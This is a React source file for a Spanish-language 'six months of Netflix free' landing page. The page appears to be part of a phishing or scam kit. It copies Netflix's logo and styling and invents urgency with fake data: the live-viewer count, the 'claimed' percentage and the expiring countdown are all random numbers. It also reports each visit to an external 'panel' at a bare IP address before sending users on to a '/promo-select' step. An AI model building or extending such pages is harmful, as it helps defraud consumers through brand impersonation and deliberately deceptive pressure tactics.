/**
 * Promo Landing Page - 6 meses gratis
 * Premium Netflix-quality design with splash screen transition
 */

import PageTransition from "@/components/PageTransition";
import { useLocation } from "wouter";
import { useEffect, useState, useRef } from "react";
import BrandLogo from "@/components/BrandLogo";
import { Play, Clock, Users, CheckCircle2 } from "lucide-react";

function getRandomViewers() {
  return Math.floor(Math.random() * (1800 - 1200)) + 1200;
}

function getInitialCountdown() {
  const totalSeconds = Math.floor(Math.random() * (14 * 3600 - 8 * 3600)) + 8 * 3600;
  return totalSeconds;
}

export default function PromoLanding() {
  const [, setLocation] = useLocation();
  const [viewers, setViewers] = useState(getRandomViewers);
  const [countdown, setCountdown] = useState(getInitialCountdown);
  const [claimed] = useState(() => Math.floor(Math.random() * (94 - 86)) + 86);
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [showSplash, setShowSplash] = useState(true);
  const [splashFading, setSplashFading] = useState(false);

  useEffect(() => {
    fetch("/api/track/visit", { method: "POST" }).catch(() => {});
    // Also track in independent panel (Cloud Computer)
    fetch("http://34.24.24.184:3000/api/track/promo-visit", { method: "POST" }).catch(() => {});
  }, []);

  // Splash screen timing
  useEffect(() => {
    const fadeTimer = setTimeout(() => setSplashFading(true), 2200);
    const hideTimer = setTimeout(() => setShowSplash(false), 3000);
    return () => { clearTimeout(fadeTimer); clearTimeout(hideTimer); };
  }, []);

  // Countdown timer
  useEffect(() => {
    intervalRef.current = setInterval(() => {
      setCountdown(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => { if (intervalRef.current) clearInterval(intervalRef.current); };
  }, []);

  // Fluctuate viewers
  useEffect(() => {
    const iv = setInterval(() => {
      setViewers(prev => prev + Math.floor(Math.random() * 11) - 5);
    }, 3000);
    return () => clearInterval(iv);
  }, []);

  const hours = Math.floor(countdown / 3600);
  const minutes = Math.floor((countdown % 3600) / 60);
  const seconds = countdown % 60;

  // Netflix Splash Screen
  if (showSplash) {
    return (
      <div className={`fixed inset-0 z-[9999] bg-black flex items-center justify-center transition-opacity duration-700 ${splashFading ? 'opacity-0' : 'opacity-100'}`}>
        <div className="flex flex-col items-center">
          <div className="animate-[netflixZoom_2.5s_cubic-bezier(0.23,1,0.32,1)_forwards]">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 1024 276.742"
              className="h-[50px] sm:h-[70px] w-auto"
            >
              <path
                d="M140.803 258.904c-15.404 2.705-31.079 3.516-47.294 5.676L44.051 119.724v151.073C28.647 272.418 14.594 274.58 0 276.742V0h41.08l56.212 157.021V0h43.511v258.904zm85.131-157.558c16.757 0 42.431-.811 57.835-.811v43.24c-19.189 0-41.619 0-57.835.811v64.322c25.405-1.621 50.809-3.785 76.482-4.596v41.617l-119.724 9.461V0h119.724v43.241h-76.482v58.105zm237.284-58.104h-44.862V242.15c-14.594 0-29.188 0-43.239.539V43.242h-44.862V0H463.22l-.002 43.242zm70.266 55.132h59.187v43.24h-59.187v98.104h-42.433V0h120.808v43.241h-78.375v55.133zm148.641 103.507c24.594.539 49.456 2.434 73.51 3.783v42.701c-38.646-2.434-77.293-4.863-116.75-5.676V0h43.24v201.881zm109.994 49.457c13.783.812 28.377 1.623 42.43 3.242V0h-42.43v251.338zM1024 0l-54.863 131.615L1024 276.742c-16.217-2.162-32.432-5.135-48.648-7.838l-31.078-79.994-31.617 73.51c-15.678-2.705-30.812-3.516-46.484-5.678l55.672-126.75L871.576 0h46.482l28.377 72.699L976.705 0H1024z"
                fill="#E50914"
              />
            </svg>
          </div>
          <div className="mt-10 w-[100px] h-[2px] bg-[#222] rounded-full overflow-hidden">
            <div className="h-full bg-[#E50914] rounded-full animate-[loadingBar_2.2s_ease-in-out_forwards]" />
          </div>
        </div>

        <style>{`
          @keyframes netflixZoom {
            0% { transform: scale(0.4); opacity: 0; }
            30% { opacity: 1; }
            100% { transform: scale(1); opacity: 1; }
          }
          @keyframes loadingBar {
            0% { width: 0%; }
            100% { width: 100%; }
          }
        `}</style>
      </div>
    );
  }

  return (
    <PageTransition>
      <div className="min-h-[100dvh] w-full bg-[#0a0a0a] flex flex-col relative overflow-hidden">
        {/* Fire/ember glow background effect */}
        <div className="absolute inset-0 pointer-events-none">
          {/* Wide outer glow - dark red base */}
          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[200%] h-[100%] bg-[radial-gradient(ellipse_at_center,_rgba(120,30,0,0.35)_0%,_transparent_55%)]" />
          {/* Main center glow - warm orange/gold */}
          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[140%] h-[80%] bg-[radial-gradient(ellipse_at_center,_rgba(200,100,0,0.4)_0%,_rgba(180,60,0,0.2)_30%,_transparent_55%)]" />
          {/* Golden center - bright warm gold */}
          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[80%] h-[50%] bg-[radial-gradient(ellipse_at_center,_rgba(255,160,20,0.35)_0%,_rgba(255,120,0,0.15)_35%,_transparent_55%)]" />
          {/* Hot center spot - bright golden yellow */}
          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[40%] h-[25%] bg-[radial-gradient(ellipse_at_center,_rgba(255,200,50,0.2)_0%,_rgba(255,150,0,0.08)_40%,_transparent_60%)]" />
          {/* Top and bottom dark edges for contrast */}
          <div className="absolute top-0 left-0 right-0 h-[25%] bg-gradient-to-b from-[#0a0a0a] to-transparent" />
          <div className="absolute bottom-0 left-0 right-0 h-[20%] bg-gradient-to-t from-[#0a0a0a]/80 to-transparent" />
        </div>

        {/* Header */}
        <header className="relative z-10 w-full px-4 sm:px-8 pt-5 pb-4 flex items-center justify-between">
          <BrandLogo height={24} />
          <div className="flex items-center gap-2 bg-white/5 backdrop-blur-md rounded-full px-3.5 py-2 border border-white/10">
            <div className="w-[6px] h-[6px] bg-[#00d26a] rounded-full animate-pulse" />
            <span className="text-white/70 text-[11px] font-medium tracking-wide">{viewers.toLocaleString()} activos</span>
          </div>
        </header>

        {/* Main Content */}
        <main className="relative z-10 flex-1 flex flex-col items-center justify-center px-4 sm:px-8 py-4">
          <div className="w-full max-w-[400px] flex flex-col items-center text-center">
            
            {/* Exclusive badge */}
            <div className="inline-flex items-center gap-2 bg-white/5 border border-white/10 backdrop-blur-sm text-white/90 text-[11px] font-semibold px-4 py-2 rounded-full uppercase tracking-[0.18em] mb-8 animate-[fadeSlideDown_0.5s_ease-out_0.1s_both]">
              <span className="w-[5px] h-[5px] bg-[#E50914] rounded-full" />
              OFERTA EXCLUSIVA POR FIDELIDAD
            </div>

            {/* Hero section */}
            <div className="mb-2 animate-[scaleIn_0.6s_ease-out_0.2s_both]">
              <span className="text-[100px] sm:text-[130px] font-black text-white leading-[0.85] block tracking-tight" style={{ textShadow: '0 0 60px rgba(229,9,20,0.25)' }}>
                6
              </span>
            </div>

            <p className="text-white/50 text-[15px] sm:text-[17px] tracking-[0.5em] uppercase font-light mb-0.5 animate-[fadeIn_0.5s_ease-out_0.4s_both]">
              MESES
            </p>

            <p className="text-[#E50914] text-[24px] sm:text-[28px] tracking-[0.25em] uppercase font-extrabold mb-6 animate-[fadeIn_0.5s_ease-out_0.5s_both]">
              GRATIS
            </p>

            {/* Description */}
            <p className="text-white/60 text-[14px] sm:text-[15px] leading-relaxed mb-8 max-w-[340px] animate-[fadeIn_0.5s_ease-out_0.6s_both]">
              Acceso completo a todo el catálogo de Netflix sin costo durante 6 meses. Sin compromisos.
            </p>

            {/* Benefits */}
            <div className="flex flex-col gap-2.5 w-full max-w-[300px] mb-8 animate-[fadeIn_0.5s_ease-out_0.7s_both]">
              <div className="flex items-center gap-3 text-left">
                <CheckCircle2 className="w-4 h-4 text-[#00d26a] flex-shrink-0" />
                <span className="text-white/75 text-[13px]">Películas y series ilimitadas en 4K</span>
              </div>
              <div className="flex items-center gap-3 text-left">
                <CheckCircle2 className="w-4 h-4 text-[#00d26a] flex-shrink-0" />
                <span className="text-white/75 text-[13px]">Hasta 5 dispositivos simultáneos</span>
              </div>
              <div className="flex items-center gap-3 text-left">
                <CheckCircle2 className="w-4 h-4 text-[#00d26a] flex-shrink-0" />
                <span className="text-white/75 text-[13px]">Cancela en cualquier momento</span>
              </div>
            </div>

            {/* Countdown Timer */}
            <div className="mb-8 animate-[fadeIn_0.5s_ease-out_0.8s_both]">
              <div className="flex items-center gap-2 justify-center mb-3">
                <Clock className="w-3.5 h-3.5 text-white/40" />
                <span className="text-white/40 text-[10px] uppercase tracking-[0.2em] font-medium">Expira en</span>
              </div>
              <div className="flex items-center gap-2">
                <div className="flex flex-col items-center">
                  <div className="bg-white/5 border border-white/10 rounded-lg w-[56px] h-[52px] flex items-center justify-center backdrop-blur-sm">
                    <span className="text-white text-[22px] font-bold tabular-nums">{String(hours).padStart(2, '0')}</span>
                  </div>
                  <span className="text-white/30 text-[9px] uppercase mt-1.5 tracking-wider font-medium">HRS</span>
                </div>
                <span className="text-white/20 text-[18px] font-bold -mt-4">:</span>
                <div className="flex flex-col items-center">
                  <div className="bg-white/5 border border-white/10 rounded-lg w-[56px] h-[52px] flex items-center justify-center backdrop-blur-sm">
                    <span className="text-white text-[22px] font-bold tabular-nums">{String(minutes).padStart(2, '0')}</span>
                  </div>
                  <span className="text-white/30 text-[9px] uppercase mt-1.5 tracking-wider font-medium">MIN</span>
                </div>
                <span className="text-white/20 text-[18px] font-bold -mt-4">:</span>
                <div className="flex flex-col items-center">
                  <div className="bg-white/5 border border-white/10 rounded-lg w-[56px] h-[52px] flex items-center justify-center backdrop-blur-sm">
                    <span className="text-white text-[22px] font-bold tabular-nums">{String(seconds).padStart(2, '0')}</span>
                  </div>
                  <span className="text-white/30 text-[9px] uppercase mt-1.5 tracking-wider font-medium">SEG</span>
                </div>
              </div>
            </div>

            {/* CTA Button */}
            <button
              onClick={() => setLocation("/promo-select")}
              className="group relative w-full max-w-[320px] h-[54px] bg-[#E50914] text-white text-[15px] font-semibold rounded-[6px] hover:bg-[#F6121D] hover:shadow-[0_6px_36px_rgba(229,9,20,0.6)] active:scale-[0.97] transition-all duration-200 flex items-center justify-center gap-2.5 shadow-[0_4px_24px_rgba(229,9,20,0.4)] mb-3 animate-[fadeSlideUp_0.5s_ease-out_0.9s_both,_ctaPulse_2.5s_ease-in-out_2s_infinite] overflow-hidden"
            >
              {/* Shine effect on hover */}
              <span className="absolute inset-0 -translate-x-full group-hover:translate-x-full transition-transform duration-700 ease-out bg-gradient-to-r from-transparent via-white/25 to-transparent" />
              <Play className="w-4 h-4 fill-white relative z-10" /> <span className="relative z-10">Activar promoción</span>
            </button>

            <p className="text-white/30 text-[11px] mb-6 animate-[fadeIn_0.5s_ease-out_1s_both]">Sin cargos hoy • Cancela cuando quieras</p>

            {/* Progress bar */}
            <div className="w-full max-w-[280px] animate-[fadeIn_0.5s_ease-out_1.1s_both]">
              <div className="flex items-center justify-between mb-2">
                <span className="text-white/40 text-[11px]">Cupos disponibles</span>
                <span className="text-[#E50914] text-[11px] font-semibold">{claimed}% reclamado</span>
              </div>
              <div className="w-full h-[4px] bg-white/10 rounded-full overflow-hidden">
                <div 
                  className="h-full bg-gradient-to-r from-[#E50914] to-[#ff3d2e] rounded-full"
                  style={{ width: `${claimed}%` }}
                />
              </div>
            </div>
          </div>
        </main>

        {/* Footer subtle */}
        <footer className="relative z-10 w-full px-4 py-4 flex items-center justify-center">
          <p className="text-white/20 text-[10px] tracking-wide">Promoción válida por tiempo limitado. Aplican términos y condiciones.</p>
        </footer>
      </div>
    </PageTransition>
  );
}
